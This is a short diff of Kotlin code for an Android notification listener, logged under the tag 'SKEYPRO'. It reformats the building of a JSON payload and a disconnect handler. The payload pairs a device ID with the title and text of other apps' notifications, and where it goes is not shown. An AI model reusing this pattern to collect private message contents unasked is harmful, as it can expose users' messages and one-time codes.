@@ -135,31 +135,12 @@ if (
             val payload =
                 JSONObject().apply {
 
-                    put(
-                        "device_id",
-                        deviceId
-                    )
-
-                    put(
-                        "package",
-                        packageName
-                    )
-
-                    put(
-                        "title",
-                        title
-                    )
-
-                    put(
-                        "text",
-                        text
-                    )
-
-                    put(
-                        "timestamp",
-                        System.currentTimeMillis()
-                    )
-
+                    put("device_id", deviceId)
+                    put( "package", packageName)                                                              
+                    put("title", title)                        
+                    put("text", text)                                             
+                    put("timestamp", System.currentTimeMillis())                   
+                        
                 }.toString()
 
             Log.d(
@@ -192,13 +173,9 @@ if (
     }
 
     override fun onListenerDisconnected() {
-
         super.onListenerDisconnected()
-
         Log.d(
-
             "SKEYPRO",
-
             "Notification Listener Disconnected"
 
         )
